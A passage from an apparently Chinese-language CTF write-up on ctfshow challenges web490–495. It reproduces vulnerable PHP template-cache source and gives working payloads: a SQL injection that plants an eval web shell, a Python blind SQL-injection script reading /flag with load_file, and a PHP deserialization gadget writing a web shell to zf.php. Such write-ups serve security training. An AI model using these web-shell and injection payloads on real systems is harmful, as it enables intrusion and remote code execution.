<p>接着这次访问md5(index)文件</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411130313269.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411130313269"></p>

<p>可以看到这里的error.php是无法利用的了</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411130349070.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411130349070"></p>

<h1 id="web490"><a href="#web490" class="headerlink" title="web490"></a>web490</h1><p>index.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 15:43:51
 Last Modified by:   h1xa
 Last Modified time: 2021-03-09 16:45:24
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

include(&#39;render/render_class.php&#39;);
include(&#39;render/db_class.php&#39;);


$action=$_GET[&#39;action&#39;];
if(!isset($action))&#123;
    header(&#39;location:index.php?action=login&#39;);
    die();    
&#125;

if($action==&#39;check&#39;)&#123;
    extract($_GET);
    $sql = &quot;select username from user where username = &#39;&quot;.$username.&quot;&#39; and password=&#39;&quot;.md5($password).&quot;&#39; order by id limit 1&quot;;
    $user=db::select_one($sql);
    if($user)&#123;
        templateUtil::render(&#39;index&#39;,array(&#39;username&#39;=&gt;$user-&gt;username));
    &#125;else&#123;
        templateUtil::render(&#39;error&#39;);
    &#125;
&#125;
if($action==&#39;clear&#39;)&#123;
    system(&#39;rm -rf cache/*&#39;);
    die(&#39;cache clear&#39;);
&#125;

if($action==&#39;login&#39;)&#123;
    templateUtil::render($action);
&#125;else&#123;
    templateUtil::render($action);
&#125;
</code></pre>
<p>这里也是含有sql注入的.这次只不过是把从sql取出的语句进行写入</p>
<p>记得先清一下文件</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411140331722.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411140331722"></p>

<p>接着登录发现是短标签,我们只要按照这个方式闭合就好</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411140305568.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411140305568"></p>

<pre><code>select username from user where username = &#39;1&#39;union select &#39;@eval($_POST[zf]);&#39;&#39; and password=&#39;6512bd43d9caa6e02c990b0a82652dca&#39; order by id limit 1
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411140520958.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411140520958"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411140614700.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411140614700"></p>

<h1 id="web491"><a href="#web491" class="headerlink" title="web491"></a>web491</h1><p>index.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 15:43:51
 Last Modified by:   h1xa
 Last Modified time: 2021-03-09 16:45:24
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

include(&#39;render/render_class.php&#39;);
include(&#39;render/db_class.php&#39;);


$action=$_GET[&#39;action&#39;];
if(!isset($action))&#123;
    header(&#39;location:index.php?action=login&#39;);
    die();    
&#125;

if($action==&#39;check&#39;)&#123;
    extract($_GET);
    $sql = &quot;select username from user where username = &#39;&quot;.$username.&quot;&#39; and password=&#39;&quot;.md5($password).&quot;&#39; order by id limit 1&quot;;
    $user=db::select_one($sql);
    if($user)&#123;
        templateUtil::render(&#39;index&#39;);
    &#125;else&#123;
        templateUtil::render(&#39;error&#39;);
    &#125;
&#125;
if($action==&#39;clear&#39;)&#123;
    system(&#39;rm -rf cache/*&#39;);
    die(&#39;cache clear&#39;);
&#125;

if($action==&#39;login&#39;)&#123;
    templateUtil::render($action);
&#125;else&#123;
    templateUtil::render($action);
&#125;
</code></pre>
<p>数据库里没东西</p>
<p>render&#x2F;render_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:52:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-09 16:19:23
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

include(&#39;file_class.php&#39;);
include(&#39;cache_class.php&#39;);

class templateUtil &#123;
    public static function render($template,$arg=array())&#123;
        if(cache::cache_exists($template))&#123;
            echo cache::get_cache($template);
        &#125;else&#123;
            $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);
            $cache=templateUtil::shade($templateContent,$arg);
            cache::create_cache($template,$cache);
            echo $cache;
        &#125;
    &#125;
    public static  function shade($templateContent,$arg)&#123;
        foreach ($arg as $key =&gt; $value) &#123;
            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, &#39;&lt;?=&#39;.$value.&#39;?&gt;&#39;, $templateContent);
        &#125;
        return $templateContent;
    &#125;

&#125;
</code></pre>
<p>cache_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 20:49:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-09 12:11:38
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


class cache&#123;
    public static function create_cache($template,$content)&#123;
        if(file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;))&#123;
            return true;
        &#125;else&#123;
            fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.php&#39;,$content);
        &#125;
    &#125;
    public static function get_cache($template)&#123;
        return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.php&#39;);
    &#125;
    public static function cache_exists($template)&#123;
        return file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;);
    &#125;

&#125;
</code></pre>
<p>这里也没有可以利用的点,那么只能在sql注入里面动手了.那么直接利用sql读取本地文件</p>
<pre><code class="php">import requests

url = &quot;http://de4a1753-a35d-401e-9d4e-aad8aa7d89a2.challenge.ctf.show/index.php&quot;

result = &quot;&quot;
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        payload = &quot;select load_file(&#39;/flag&#39;)&quot;
        params = &#123;
            &#39;username&#39;: f&quot;1&#39; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- + #&quot;,
            &#39;password&#39;: &#39;1&#39;,
            &#39;action&#39; : &#39;check&#39;
        &#125;

        r = requests.get(url,params=params)
        #print(r.text)
        if &quot;username&quot;  in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
</code></pre>
<h1 id="web492"><a href="#web492" class="headerlink" title="web492"></a>web492</h1><pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 15:43:51
 Last Modified by:   h1xa
 Last Modified time: 2021-03-10 12:16:25
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

include(&#39;render/render_class.php&#39;);
include(&#39;render/db_class.php&#39;);


$action=$_GET[&#39;action&#39;];
if(!isset($action))&#123;
    header(&#39;location:index.php?action=login&#39;);
    die();    
&#125;

if($action==&#39;check&#39;)&#123;
    extract($_GET);
    if(preg_match(&#39;/^[A-Za-z0-9]+$/&#39;, $username))&#123;
        $sql = &quot;select username from user where username = &#39;&quot;.$username.&quot;&#39; and password=&#39;&quot;.md5($password).&quot;&#39; order by id limit 1&quot;;
        $user=db::select_one_array($sql);
    &#125;
    if($user)&#123;
        templateUtil::render(&#39;index&#39;,$user);
    &#125;else&#123;
        templateUtil::render(&#39;error&#39;);
    &#125;
&#125;
if($action==&#39;clear&#39;)&#123;
    system(&#39;rm -rf cache/*&#39;);
    die(&#39;cache clear&#39;);
&#125;

if($action==&#39;login&#39;)&#123;
    templateUtil::render($action);
&#125;else&#123;
    templateUtil::render($action);
&#125;
</code></pre>
<p>render&#x2F;render_class</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:52:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-10 13:37:14
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

include(&#39;file_class.php&#39;);
include(&#39;cache_class.php&#39;);

class templateUtil &#123;
    public static function render($template,$arg=array())&#123;
        if(cache::cache_exists($template))&#123;
            echo cache::get_cache($template);
        &#125;else&#123;
            $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);
            $cache=templateUtil::shade($templateContent,$arg);
            cache::create_cache($template,$cache);
            echo $cache;
        &#125;
    &#125;
    public static  function shade($templateContent,$arg)&#123;
        foreach ($arg as $key =&gt; $value) &#123;
            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, &#39;&lt;！--&#39;.$value.&#39;--&gt;&#39;, $templateContent);
        &#125;
        return $templateContent;
    &#125;

&#125;

</code></pre>
<p>render&#x2F;db_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 20:43:40
 Last Modified by:   h1xa
 Last Modified time: 2021-03-10 12:12:00
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

class db&#123;
    

    public static  function getConnection()&#123;
         $username=&#39;root&#39;;
         $password=&#39;root&#39;;
         $port=&#39;3306&#39;;
         $addr=&#39;127.0.0.1&#39;;
         $database=&#39;ctfshow&#39;;
        return new mysqli($addr,$username,$password,$database);
    &#125;

    public static function select_one($sql)&#123;
        $conn = db::getConnection();
        $result=$conn-&gt;query($sql);
        if($result)&#123;
            return $result-&gt;fetch_object();
        &#125;

    &#125;
    public static function select_one_array($sql)&#123;
        $conn = db::getConnection();
        $result=$conn-&gt;query($sql);
        if($result)&#123;
            return $result-&gt;fetch_assoc();
        &#125;

    &#125;
&#125;
</code></pre>
<p>templates&#x2F;index.php</p>
<pre><code class="php">&lt;!--
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 16:54:39
 Last Modified by:   h1xa
 Last Modified time: 2021-03-09 16:21:04
 email: h1xa@ctfer.com
 link: https://ctfer.com
 path /templates/index.php
--&gt;

&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;CTFshow 新手入门题目 &lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &#123;&#123;username&#125;&#125;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<pre><code>/^[A-Za-z0-9]+$/    表示匹配以数字字母开头结尾中间全是数字字母
</code></pre>
<p>那么这里简单变量覆盖就可,但是要注意一下将它的注释进行闭合</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411200031843.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411200031843"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411200106381.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411200106381"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411200118887.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411200118887"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411200135182.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411200135182"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411200208135.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411200208135"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411201037379.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411201037379"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411201043845.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411201043845"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411201050704.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411201050704"></p>

<h1 id="web493"><a href="#web493" class="headerlink" title="web493"></a>web493</h1><p>index.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 15:43:51
 Last Modified by:   h1xa
 Last Modified time: 2021-03-12 17:23:33
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/
session_start();
include(&#39;render/render_class.php&#39;);
include(&#39;render/db_class.php&#39;);


$action=$_GET[&#39;action&#39;];
if(!isset($action))&#123;
    if(isset($_COOKIE[&#39;user&#39;]))&#123;
        $c=$_COOKIE[&#39;user&#39;];
        $user=unserialize($c);
        if($user)&#123;
            templateUtil::render(&#39;index&#39;);
        &#125;else&#123;
            header(&#39;location:index.php?action=login&#39;);
        &#125;
    &#125;else&#123;
        header(&#39;location:index.php?action=login&#39;);
    &#125;
    die();    
&#125;

if($action==&#39;check&#39;)&#123;
    extract($_GET);
    if(preg_match(&#39;/^[A-Za-z0-9]+$/&#39;, $username))&#123;
        $sql = &quot;select username from user where username = &#39;&quot;.$username.&quot;&#39; and password=&#39;&quot;.md5($password).&quot;&#39; order by id limit 1&quot;;
        $db=new db();
        $user=$db-&gt;select_one($sql);
    &#125;
    if($user)&#123;
        setcookie(&#39;user&#39;,$user);
        templateUtil::render(&#39;index&#39;);
    &#125;else&#123;
        templateUtil::render(&#39;error&#39;);
    &#125;
&#125;
if($action==&#39;clear&#39;)&#123;
    system(&#39;rm -rf cache/*&#39;);
    die(&#39;cache clear&#39;);
&#125;

if($action==&#39;login&#39;)&#123;
    templateUtil::render($action);
&#125;else&#123;
    templateUtil::render($action);
&#125;
</code></pre>
<p>render&#x2F;render_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:52:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-12 15:52:18
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

include(&#39;file_class.php&#39;);
include(&#39;cache_class.php&#39;);

class templateUtil &#123;
    public static function render($template,$arg=array())&#123;
        if(cache::cache_exists($template))&#123;
            echo cache::get_cache($template);
        &#125;else&#123;
            $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);
            $cache=templateUtil::shade($templateContent,$arg);
            cache::create_cache($template,$cache);
            echo $cache;
        &#125;
    &#125;
    public static  function shade($templateContent,$arg=array())&#123;
        foreach ($arg as $key =&gt; $value) &#123;
            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, &#39;&lt;！--&#39;.$value.&#39;--&gt;&#39;, $templateContent);
        &#125;
        return $templateContent;
    &#125;

&#125;



</code></pre>
<p>render&#x2F;db_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 20:43:40
 Last Modified by:   h1xa
 Last Modified time: 2021-03-12 17:43:56
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

error_reporting(0);
class db&#123;
    
    public $db;
    public $log;
    public $sql;
    public $username=&#39;root&#39;;
    public $password=&#39;root&#39;;
    public $port=&#39;3306&#39;;
    public $addr=&#39;127.0.0.1&#39;;
    public $database=&#39;ctfshow&#39;;
    public function __construct()&#123;
        $this-&gt;log=new dbLog();
        $this-&gt;db=$this-&gt;getConnection();
    &#125;

    public function getConnection()&#123;
         
        return new mysqli($this-&gt;addr,$this-&gt;username,$this-&gt;password,$this-&gt;database);
    &#125;

    public  function select_one($sql)&#123;
        $this-&gt;sql=$sql;
        $conn = db::getConnection();
        $result=$conn-&gt;query($sql);
        if($result)&#123;
            return $result-&gt;fetch_object();
        &#125;

    &#125;
    public  function select_one_array($sql)&#123;
        $this-&gt;sql=$sql;
        $conn = db::getConnection();
        $result=$conn-&gt;query($sql);
        if($result)&#123;
            return $result-&gt;fetch_assoc();
        &#125;

    &#125;
    public function __destruct()&#123;
        $this-&gt;log-&gt;log($this-&gt;sql);
    &#125;
&#125;
class dbLog&#123;
    public $sql;
    public $content;
    public $log;

    public function __construct()&#123;
        $this-&gt;log=&#39;log/&#39;.date_format(date_create(),&quot;Y-m-d&quot;).&#39;.txt&#39;;
    &#125;
    public function log($sql)&#123;
        $this-&gt;content = $this-&gt;content.date_format(date_create(),&quot;Y-m-d-H-i-s&quot;).&#39; &#39;.$sql.&#39; \r\n&#39;;
    &#125;
    public function __destruct()&#123;
        file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);
    &#125;
&#125;


</code></pre>
<p>&#x2F;render&#x2F;file_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:56:41
 Last Modified by:   h1xa
 Last Modified time: 2021-03-09 14:08:48
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

error_reporting(0);
class fileUtil&#123;

    public static function read($filename)&#123;
        return file_get_contents($filename);
    &#125;

    public static function write($filename,$content,$append =0)&#123;
        if($append)&#123;
            file_put_contents($filename, $content,FILE_APPEND);
        &#125;else&#123;
            file_put_contents($filename, $content);
        &#125;
    &#125;
&#125;
</code></pre>
<p>cache_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 20:49:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-09 12:11:38
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


class cache&#123;
    public static function create_cache($template,$content)&#123;
        if(file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;))&#123;
            return true;
        &#125;else&#123;
            fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.php&#39;,$content);
        &#125;
    &#125;
    public static function get_cache($template)&#123;
        return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.php&#39;);
    &#125;
    public static function cache_exists($template)&#123;
        return file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;);
    &#125;

&#125;
</code></pre>
<p>简单反序列化</p>
<pre><code class="php">&lt;?php

class dbLog&#123;
    public $sql;
    public $content =&#39;&lt;?php @eval($_POST[zf]);?&gt;&#39;;
    public $log =&quot;./zf.php&quot;;

    public function __destruct()&#123;
        file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);
    &#125;
&#125;

$final = new dbLog();
echo &#39;;user=&#39;.urlencode(serialize($final));
#;user=O%3A5%3A%22dbLog%22%3A3%3A%7Bs%3A3%3A%22sql%22%3BN%3Bs%3A7%3A%22content%22%3Bs%3A26%3A%22%3C%3Fphp+%40eval%28%24_POST%5Bzf%5D%29%3B%3F%3E%22%3Bs%3A3%3A%22log%22%3Bs%3A8%3A%22.%2Fzf.php%22%3B%7D
</code></pre>
<p>这个会写到根目录下面,是网页的根目录,原因是index.php文件调用的file_put_contents()所以以当前目录为基础进行写入</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411215049150.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411215049150"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411215056027.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411215056027"></p>

<h1 id="web494-495"><a href="#web494-495" class="headerlink" title="web494-495"></a>web494-495</h1><p>index.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 15:43:51
